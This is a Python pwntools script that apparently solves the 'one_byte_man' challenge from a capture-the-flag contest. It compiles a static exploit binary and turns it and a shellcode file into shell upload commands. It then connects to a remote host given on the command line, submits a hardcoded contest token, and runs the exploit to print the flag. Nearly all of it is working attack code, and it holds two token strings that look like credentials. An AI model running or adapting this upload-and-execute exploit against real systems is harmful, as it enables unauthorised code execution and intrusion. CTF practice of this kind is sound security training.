#!/usr/bin/env python3
from pwn import *
import subprocess
import sys

context.log_level = 'debug'

#  subprocess.run("gcc -o shellcode.elf shellcode.c", shell=True)
with open("shellcode.elf", "rb") as f:
    shellcode = f.read()
#  shellcode = shellcode[shellcode.find(b"V1me")+4:shellcode.find(b"V7me")]

with open("shellcode.bin", "wb") as f:
    f.write(shellcode)

subprocess.run("musl-gcc -static -o exp exp.c; python3 upload.py shellcode.bin > upload.sh; python3 upload.py exp >> upload.sh", shell=True)
with open("upload.sh", "a") as f:
    f.write("/busybox chmod a=rx exp; /busybox sleep 1;./exp shellcode shellcode.bin\n")

with open("upload.sh", "rb") as f:
    payload = f.read()

# p = process("./start.sh")
# if len(sys.argv) != 3:
#     print(f"Usage: python3 {sys.argv[0]} <host> <port>")
#     exit()
p = remote(sys.argv[1], int(sys.argv[2], 10))
# p = process("/home/v1me/workspace/hackergame2022-challenges/one_byte_man/files/scripts/run.sh")

def token():
    p.recvuntil(b"token: ")
    return p.sendline(b"1119:MEUCIQDUCFthMiI3h5RpZfMZqW1G4wYw8CauHcL0KB6A0DbizgIgVq8QvPkUd9uVtFyjHGqW5p5K3toOCls8PhS5kqKE728=")
    # return p.sendline(b"10:MEUCIQDv1SAQChF8NRMOvxtZLrDrg+vPuGGyc5OTTxUkX5cduAIgfFcby3V8pvPLhPd6hanW1ywIq01levKlnWSia7TxBsE=")


token()

p.recvuntil(b'Here is the shell! U have 10s to make you one-byte-man! :)')
p.sendline(b"/busybox echo -e -n \"\\x90\" > shellcode")
p.sendline(payload)

# p.interactive()

# if the prefix is not "flag{", change the prefix.
p.recvuntil(b"flag{")
print((b"flag{" + p.recvuntil(b"}")).decode())
